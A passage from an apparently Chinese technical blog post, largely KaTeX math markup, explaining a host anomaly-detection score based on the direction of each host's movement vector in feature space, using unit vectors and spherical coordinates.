mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6408449999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.3540079999999999em;"><span style="top:-3.6029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.596994em;"><span class="pstrut" style="height:4.4em;"></span><span class="hide-tail" style="min-width:1.02em;height:2.48em;"><svg width='400em' height='2.48em' viewBox='0 0 400000 2592' preserveAspectRatio='xMinYMin slice'><path d='M424,2478c-1.3,-0.7,-38.5,-172,-111.5,-514c-73,-342,-109.8,-513.3,-110.5,-514c0,-2,-10.7,14.3,-32,49c-4.7,7.3,-9.8,15.7,-15.5,25c-5.7,9.3,-9.8,16,-12.5,20s-5,7,-5,7c-4,-3.3,-8.3,-7.7,-13,-13s-13,-13,-13,-13s76,-122,76,-122s77,-121,77,-121s209,968,209,968c0,-2,84.7,-361.7,254,-1079c169.3,-717.3,254.7,-1077.7,256,-1081c4,-6.7,10,-10,18,-10H400000v40H1014.6s-87.3,378.7,-272.6,1166c-185.3,787.3,-279.3,1182.3,-282,1185c-2,6,-10,9,-24,9c-8,0,-12,-0.7,-12,-2z M1001 80H400000v40H1014z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8030060000000003em;"><span></span></span></span></span></span></span></span></span></p><p>该分数可以来表示主机相对于其最近的历史情况，其位置改变了多少。</p><h2 id="83-特征空间中运动方向的可能性"><a class="markdownIt-Anchor" href="#83-特征空间中运动方向的可能性"></a> 8.3 特征空间中运动方向的可能性</h2><p>该分数的设计考虑了移动向量的方向，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{m}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的三个坐标是如何协同变化的，不常规的方向应当被视作可疑行为。</p><p>用单位向量 (Unit vector)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mover accent="true"><mi mathvariant="bold">m</mi><mo>^</mo></mover><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\hat{\mathbf{m}}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85788em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.70788em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span></span></span><span style="top:-3.01344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>来表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{m}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的方向：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mover accent="true"><mi mathvariant="bold">m</mi><mo>^</mo></mover><mi>t</mi></msub><mo>=</mo><mfrac><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub><mrow><mo fence="true">∥</mo><msub><mi mathvariant="bold">m</mi><mi>t</mi></msub><mo fence="true">∥</mo></mrow></mfrac><mo>=</mo><mrow><mo fence="true">(</mo><msub><mi>u</mi><mi>t</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>t</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>t</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{\mathbf{m}}_{t}=\frac{\mathbf{m}_{t}}{\left\|\mathbf{m}_{t}\right\|}=\left(u_{t}, v_{t}, w_{t}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85788em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.70788em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span></span></span><span style="top:-3.01344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2412079999999999em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7212079999999998em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∥</span></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathbf mtight">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∥</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathbf mtight">m</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></p><p>下图展示了1000台主机的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mover accent="true"><mi mathvariant="bold">m</mi><mo>^</mo></mover><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\hat{\mathbf{m}}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85788em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.70788em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">m</span></span></span></span><span style="top:-3.01344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>单位向量：</p><p><img src="https://img-blog.csdnimg.cn/20200220181800959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>我们注意到，其分布是不均匀的，一些区域的分布密度要远高于其它区域，这意味着朝着某些方向的运动要比其它方向更为常见。</p><p>为了更方便地理解其分布，我们使用球面坐标（spherical coordinates）：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ρ</mi><mo>=</mo><msqrt><mrow><msubsup><mi>u</mi><mi>t</mi><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>v</mi><mi>t</mi><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>w</mi><mi>t</mi><mn>2</mn></msubsup></mrow></msqrt></mrow><annotation encoding="application/x-tex">\rho=\sqrt{u_{t}^{2}+v_{t}^{2}+w_{t}^{2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ρ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.27992400000000006em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9600759999999999em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959079999999998em;"><span style="top:-2.454244em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999992em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959079999999998em;"><span style="top:-2.454244em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999992em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959079999999998em;"><span style="top:-2.454244em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999992em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.920076em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z M1001 80H40000v40H1012z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.27992400000000006em;"><span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo>=</mo><mi>arccos</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mfrac><msub><mi>w</mi><mi>t</mi></msub><msqrt><mrow><msubsup><mi>u</mi><mi>t</mi><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>v</mi><mi>t</mi><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>w</mi><mi>t</mi><mn>2</mn></msubsup></mrow></msqrt></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi=\arccos \left(\frac{w_{t}}{\sqrt{u_{t}^{2}+v_{t}^{2}+w_{t}^{2}}}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">φ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mop">arccos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7114919999999999em;"><span style="top:-2.4590625em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0441964285714287em;"><span class="svg-align" style="top:-3.428571428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="mord mtight" style="padding-left:1.19em;"><span class="mord mtight"><span class="mord mathdefault mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8051142857142858em;"><span style="top:-2.209457142857143em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29054285714285716em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8051142857142858em;"><span style="top:-2.209457142857143em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29054285714285716em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8051142857142858em;"><span style="top:-2.209457142857143em;margin-left:-0.02691em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29054285714285716em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.016196428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.5428571428571431em;"><svg width='400em' height='1.5428571428571431em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.41237499999999994em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:-0.02691em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8296em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi><mo>=</mo><mi>arctan</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mfrac><msub><mi>v</mi><mi>t</mi></msub><msub><mi>u</mi><mi>t</mi></msub></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\theta=\arctan \left(\frac{v_{t}}{u_{t}}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.80002em;vertical-align:-0.65002em;"></span><span class="mop">arctan</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7114919999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ρ</mi><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\rho\geq0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ρ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>表示向量的长度（magnitude），<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>0</mn><mo>∘</mo></msup><mo>≤</mo><mi>φ</mi><mo>≤</mo><mn>18</mn><msup><mn>0</mn><mo>∘</mo></msup></mrow><annotation encoding="application/x-tex">0^{\circ} \leq \varphi \leq 180^{\circ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.810085em;vertical-align:-0.13597em;"></span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.674115em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∘</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">φ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.674115em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.674115em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∘</span></span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><mn>18</mn><msup><mn>0</mn><mo>∘</mo></msup><mo>≤</mo><mi>θ</mi><mo>≤</mo><mn>18</mn><msup><mn>0</mn><mo>∘</mo></msup></mrow><annotation encoding="application/x-tex">-180^{\circ} \leq \theta \leq 180^{\circ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.810085em;vertical-align:-0.13597em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord">8</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.674115em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∘</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" 